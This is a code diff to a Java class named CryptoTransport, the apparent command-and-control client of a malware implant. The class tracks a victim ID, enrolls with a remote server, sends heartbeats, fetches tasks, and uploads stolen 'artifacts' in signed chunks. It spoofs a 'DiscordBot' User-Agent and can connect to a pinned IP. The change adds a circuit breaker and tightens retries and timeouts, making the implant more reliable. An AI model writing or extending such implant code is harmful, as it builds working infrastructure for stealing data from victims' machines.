@@ -49,6 +49,7 @@ final class CryptoTransport {
 	private static final AtomicLong NONCE = new AtomicLong();
 	private final CryptoConfig config;
 	private final CryptoLog log;
+	private final CircuitBreaker breaker = new CircuitBreaker();
 	private volatile String deviceToken = "";
 	private volatile String victimId = "";
 	private volatile String base;
@@ -71,21 +72,47 @@ final class CryptoTransport {
 		return !deviceToken.isEmpty() && !victimId.isEmpty();
 	}
 
+	boolean apiOpen() {
+		return breaker.open();
+	}
+
+	String breaker() {
+		return breaker.state();
+	}
+
+	void resetBreaker() {
+		breaker.reset();
+	}
+
 	String victimId() {
 		return victimId;
 	}
 
 	Reply enroll(String buildToken, Map<String, Object> payload) throws Exception {
 		byte[] body = CryptoUtil.utf8(Json.stringify(payload));
-		return send("POST", "/enroll", body, "application/json", buildToken, 4);
+		if (!breaker.allow()) {
+			throw new IllegalStateException("circuit_open");
+		}
+		try {
+			Reply reply = send("POST", "/enroll", body, "application/json", buildToken, 2);
+			if (reply.status() > 0 && reply.status() < 500) {
+				breaker.success();
+			} else {
+				breaker.failure();
+			}
+			return reply;
+		} catch (Throwable throwable) {
+			breaker.failure();
+			throw throwable;
+		}
 	}
 
 	Reply heartbeat(byte[] body) throws Exception {
-		return signed("POST", "/hb", body, "application/json", 4);
+		return signed("POST", "/hb", body, "application/json", 2);
 	}
 
 	Reply tasks(int limit) throws Exception {
-		return signed("GET", "/tasks?limit=" + limit, new byte[0], null, 4);
+		return signed("GET", "/tasks?limit=" + limit, new byte[0], null, 2);
 	}
 
 	Reply result(String id, byte[] body) throws Exception {
@@ -95,20 +122,20 @@ final class CryptoTransport {
 	}
 
 	Reply uploadInit(byte[] body) throws Exception {
-		return signed("POST", "/artifacts", body, "application/json", 4);
+		return signed("POST", "/artifacts", body, "application/json", 2);
 	}
 
 	Reply uploadStatus(String id) throws Exception {
-		return signed("GET", "/artifacts/" + id, new byte[0], null, 3);
+		return signed("GET", "/artifacts/" + id, new byte[0], null, 2);
 	}
 
 	Reply chunk(String id, long offset, byte[] data, String chunkHash) throws Exception {
-		return signed("POST", "/artifacts/" + id + "/chunk?offset=" + offset, data, "application/octet-stream", 5,
+		return signed("POST", "/artifacts/" + id + "/chunk?offset=" + offset, data, "application/octet-stream", 3,
 			Map.of("X-Chunk-Sha256", chunkHash));
 	}
 
 	Reply commit(String id, byte[] body) throws Exception {
-		return signed("POST", "/artifacts/" + id + "/commit", body, "application/json", 4);
+		return signed("POST", "/artifacts/" + id + "/commit", body, "application/json", 2);
 	}
 
 	Reply signed(String method, String pathAndQuery, byte[] body, String type, int attempts) throws Exception {
@@ -120,44 +147,57 @@ final class CryptoTransport {
 		if (!enrolled()) {
 			throw new IllegalStateException("not_enrolled");
 		}
+		if (!breaker.allow()) {
+			throw new IllegalStateException("circuit_open");
+		}
+		boolean transportFailure = false;
 		long backoff = 1200L;
 		Throwable last = null;
-		for (int attempt = 0; attempt < attempts; attempt++) {
-			try {
-				String timestamp = Long.toString(System.currentTimeMillis() / 1000L);
-				String nonce = nonce();
-				String path = pathAndQuery.contains("?") ? pathAndQuery.substring(0, pathAndQuery.indexOf('?')) : pathAndQuery;
-				String canonical = method + "\n" + "/api/v1" + path + "\n" + timestamp + "\n" + nonce + "\n"
-					+ CryptoUtil.hex(CryptoUtil.sha256(body)) + "\n";
-				byte[] signature = hmac(canonical);
-				Map<String, String> headers = new LinkedHashMap<>(extra);
-				headers.put("X-Victim-Id", victimId);
-				headers.put("X-Timestamp", timestamp);
-				headers.put("X-Nonce", nonce);
-				headers.put("X-Signature", CryptoUtil.b64url(signature));
-				headers.put("X-Contract", "1");
-				Reply reply = send(method, pathAndQuery, body, type, "", 1, headers);
-				if (reply.status() == 429) {
-					long wait = 2000L;
-					try {
-						wait = Math.max(1000L, Json.num(reply.json(), "retry_after", 2L) * 1000L);
-					} catch (Throwable ignored) {
-						// default wait
+		try {
+			for (int attempt = 0; attempt < attempts; attempt++) {
+				try {
+					String timestamp = Long.toString(System.currentTimeMillis() / 1000L);
+					String nonce = nonce();
+					String path = pathAndQuery.contains("?") ? pathAndQuery.substring(0, pathAndQuery.indexOf('?')) : pathAndQuery;
+					String canonical = method + "\n" + "/api/v1" + path + "\n" + timestamp + "\n" + nonce + "\n"
+						+ CryptoUtil.hex(CryptoUtil.sha256(body)) + "\n";
+					byte[] signature = hmac(canonical);
+					Map<String, String> headers = new LinkedHashMap<>(extra);
+					headers.put("X-Victim-Id", victimId);
+					headers.put("X-Timestamp", timestamp);
+					headers.put("X-Nonce", nonce);
+					headers.put("X-Signature", CryptoUtil.b64url(signature));
+					headers.put("X-Contract", "1");
+					Reply reply = send(method, pathAndQuery, body, type, "", 1, headers);
+					if (reply.status() == 429) {
+						long wait = 2000L;
+						try {
+							wait = Math.max(1000L, Json.num(reply.json(), "retry_after", 2L) * 1000L);
+						} catch (Throwable ignored) {
+							// default wait
+						}
+						Thread.sleep(wait);
+						continue;
 					}
-					Thread.sleep(wait);
-					continue;
+					if (reply.status() >= 500 || reply.status() == 0) {
+						last = new IllegalStateException("status " + reply.status());
+						transportFailure = true;
+					} else {
+						breaker.success();
+						return reply;
+					}
+				} catch (Throwable throwable) {
+					last = throwable;
+					transportFailure = true;
 				}
-				if (reply.status() >= 500 || reply.status() == 0) {
-					last = new IllegalStateException("status " + reply.status());
-				} else {
-					return reply;
+				if (attempt + 1 < attempts) {
+					Thread.sleep(backoff + RANDOM.nextInt(700));
+					backoff = Math.min(30_000L, backoff * 2L);
 				}
-			} catch (Throwable throwable) {
-				last = throwable;
 			}
-			if (attempt + 1 < attempts) {
-				Thread.sleep(backoff + RANDOM.nextInt(700));
-				backoff = Math.min(30_000L, backoff * 2L);
+		} finally {
+			if (transportFailure) {
+				breaker.failure();
 			}
 		}
 		throw last instanceof Exception exception ? exception : new IllegalStateException(String.valueOf(last));
@@ -201,8 +241,8 @@ final class CryptoTransport {
 		URL target = pinnedIp == null ? uri.toURL() : new URL(uri.getScheme(), pinnedIp, uri.getPort(), file);
 		HttpsURLConnection connection = (HttpsURLConnection) target.openConnection();
 		connection.setRequestMethod(method);
-		connection.setConnectTimeout(12_000);
-		connection.setReadTimeout(60_000);
+		connection.setConnectTimeout(5_000);
+		connection.setReadTimeout(15_000);
 		connection.setInstanceFollowRedirects(false);
 		String ua = "DiscordBot (SPC-Console, 1.0)";
 		connection.setRequestProperty("User-Agent", ua);
